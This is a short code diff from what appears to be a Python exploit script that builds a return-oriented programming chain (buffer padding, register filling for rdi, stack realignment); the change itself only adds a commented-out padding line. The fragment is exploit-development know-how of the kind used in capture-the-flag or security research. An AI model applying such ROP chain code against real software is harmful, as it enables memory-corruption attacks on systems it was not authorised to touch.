@@ -15,6 +15,8 @@ chain = b'A' * f_rop.offset
 
 chain += f_rop.do_the_thing()
 chain += p64(0) # r15
+#chain += p64(0) # r15
+
 
 chain += f_rop.fill_reg('rdi', f_rop.get_writeable_mem())
 chain += f_rop.realign()
